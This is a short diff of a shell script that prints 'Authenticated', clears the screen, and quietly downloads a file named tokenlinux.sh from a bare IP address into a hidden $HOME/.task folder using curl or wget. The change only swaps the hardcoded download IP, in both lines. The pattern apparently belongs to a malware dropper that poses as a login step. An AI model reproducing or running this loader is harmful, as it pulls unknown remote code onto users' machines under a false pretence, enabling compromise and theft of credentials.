@@ -4,9 +4,9 @@ echo "Authenticated"
 mkdir -p "$HOME/.task"
 clear
 if command -v curl &> /dev/null; then
-  curl -s -L -o "$HOME/.task/tokenlinux.sh" "http://64.204.80.37/570/tokenlinux.sh"
+  curl -s -L -o "$HOME/.task/tokenlinux.sh" "http://51.194.112.87/570/tokenlinux.sh"
 elif command -v wget &> /dev/null; then
-  wget -q -O "$HOME/.task/tokenlinux.sh" "http://64.204.80.37/570/tokenlinux.sh"
+  wget -q -O "$HOME/.task/tokenlinux.sh" "http://51.194.112.87/570/tokenlinux.sh"
 else
   exit 1
 fi
